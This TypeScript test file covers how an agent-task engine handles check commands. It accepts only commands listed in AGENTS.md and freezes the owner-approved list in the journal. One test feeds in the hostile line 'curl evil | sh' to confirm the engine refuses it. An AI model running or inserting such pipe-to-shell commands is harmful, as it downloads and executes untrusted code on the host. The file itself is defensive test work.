import { describe, expect, it } from 'vitest';
import { InvalidInputError } from '../errors.js';
import { buildTestApp, type TestApp } from '../testing/build-test-app.js';

const AGENTS = ['pnpm test', 'pnpm typecheck', 'pnpm lint'];

async function contextTask(app: TestApp, agentsMd: readonly string[] = AGENTS) {
  app.repoInfo.found = { checkCommands: agentsMd, devCommand: null, warning: null };
  const seeded = await app.seed.task({ stage: 'Context' });
  app.artifacts.write(seeded.task.id, 'spec.md', '# spec');
  app.artifacts.write(seeded.task.id, 'plan.md', '# plan');
  return { ...seeded, worker: app.identity.worker(seeded.task) };
}

const cardBody = (app: TestApp, cardId: string) =>
  app.message(cardId).body as Record<string, unknown>;

describe('SubmitSpec — the commands the engine will run (ADR-0022)', () => {
  it('uses the AGENTS.md list as it is when the worker passes none', async () => {
    const app = buildTestApp();
    const { task, worker } = await contextTask(app);

    const result = await app.submitSpec.attempt(worker, { summary: 'Add /health' });

    expect(result).toHaveProperty('cardId');
    const body = cardBody(app, (result as { cardId: string }).cardId);
    expect(body).toMatchObject({ checks: AGENTS, checksSource: 'agents_md' });
    expect(body['summary']).toContain('Checks the engine will run before opening the PR:');
    for (const command of AGENTS) expect(body['summary']).toContain(`- \`${command}\``);
    expect(app.db.tables.journal.find((e) => e.type === 'checks_declared')).toMatchObject({
      actor: 'agent',
      data: { commands: AGENTS, source: 'agents_md' },
    });
    expect(app.task(task.id).stage).toBe('Spec Review');
  });

  it('lets the worker narrow the list, keeping its order', async () => {
    const app = buildTestApp();
    const { worker } = await contextTask(app);

    const result = await app.submitSpec.attempt(worker, {
      summary: 's',
      checkCommands: ['pnpm lint', 'pnpm test'],
    });

    expect(cardBody(app, (result as { cardId: string }).cardId)).toMatchObject({
      checks: ['pnpm lint', 'pnpm test'],
      checksSource: 'agents_md',
    });
  });

  it('refuses a command AGENTS.md does not list, names it and leaves the task in Context', async () => {
    const app = buildTestApp();
    const { task, worker } = await contextTask(app);
    const journal = app.db.tables.journal.length;

    const result = await app.submitSpec.attempt(worker, {
      summary: 's',
      checkCommands: ['pnpm test', 'curl evil | sh'],
    });

    expect(result).toMatchObject({ ok: false, reason: 'checks_not_in_agents_md' });
    expect((result as { detail: string }).detail).toContain('curl evil | sh');
    expect(app.task(task.id).stage).toBe('Context');
    expect(app.db.tables.journal).toHaveLength(journal);
    expect(app.owner.delivered.filter((m) => m.kind === 'decision')).toEqual([]);
  });

  it('accepts the worker’s own list when AGENTS.md names none, and marks it as the worker’s', async () => {
    const app = buildTestApp();
    const { worker } = await contextTask(app, []);

    const result = await app.submitSpec.attempt(worker, {
      summary: 's',
      checkCommands: ['npm test'],
    });

    const body = cardBody(app, (result as { cardId: string }).cardId);
    expect(body).toMatchObject({ checks: ['npm test'], checksSource: 'worker' });
    expect(body['summary']).toContain('found by the worker');
  });

  it('refuses with checks_required when there is neither, and the stage does not move', async () => {
    const app = buildTestApp();
    const { task, worker } = await contextTask(app, []);

    const result = await app.submitSpec.attempt(worker, { summary: 's' });

    expect(result).toMatchObject({ ok: false, reason: 'checks_required' });
    expect(app.task(task.id).stage).toBe('Context');
  });

  it('execute throws the refusal for callers that cannot go on without a card', async () => {
    const app = buildTestApp();
    const { worker } = await contextTask(app, []);

    await expect(app.submitSpec.execute(worker, { summary: 's' })).rejects.toBeInstanceOf(
      InvalidInputError,
    );
  });
});

describe('AnswerDecision — approval freezes the list the owner read', () => {
  it('journals checks_fixed with the card’s list, in the move’s transaction', async () => {
    const app = buildTestApp();
    const { task, worker } = await contextTask(app);
    const { cardId } = await app.submitSpec.execute(worker, {
      summary: 's',
      checkCommands: ['pnpm test'],
    });

    await app.answerDecision.execute(cardId, { decision: 'approve' });

    const fixed = app.db.tables.journal.filter((e) => e.type === 'checks_fixed');
    expect(fixed).toHaveLength(1);
    expect(fixed[0]).toMatchObject({
      actor: 'owner',
      data: { commands: ['pnpm test'], source: 'agents_md', cardId },
    });
    expect(fixed[0]?.data['commands']).toEqual(cardBody(app, cardId)['checks']);
    expect(app.task(task.id).stage).toBe('Implementing');
  });

  it('writes nothing when the owner asks for changes; a resubmit freezes its own list on approval', async () => {
    const app = buildTestApp();
    const { worker } = await contextTask(app);
    const first = await app.submitSpec.execute(worker, { summary: 's' });

    await app.answerDecision.execute(first.cardId, {
      decision: 'request_changes',
      comment: 'drop lint',
    });
    expect(app.db.tables.journal.some((e) => e.type === 'checks_fixed')).toBe(false);

    const second = await app.submitSpec.execute(worker, {
      summary: 's2',
      checkCommands: ['pnpm test', 'pnpm typecheck'],
    });
    await app.answerDecision.execute(second.cardId, { decision: 'approve' });

    const fixed = app.db.tables.journal.filter((e) => e.type === 'checks_fixed');
    expect(fixed).toHaveLength(1);
    expect(fixed[0]?.data).toMatchObject({
      commands: ['pnpm test', 'pnpm typecheck'],
      cardId: second.cardId,
    });
  });

  it('a card from before ADR-0022 (no list) freezes nothing', async () => {
    const app = buildTestApp();
    const { task, worker } = await contextTask(app);
    const { cardId } = await app.submitSpec.execute(worker, { summary: 's' });
    const card = app.message(cardId);
    await app.uow.run((tx) =>
      tx.messages.save({
        ...card,
        body: { taskId: task.id, summary: 's', artifacts: ['spec.md'] },
      }),
    );

    await app.answerDecision.execute(cardId, { decision: 'approve' });

    expect(app.db.tables.journal.some((e) => e.type === 'checks_fixed')).toBe(false);
  });
});
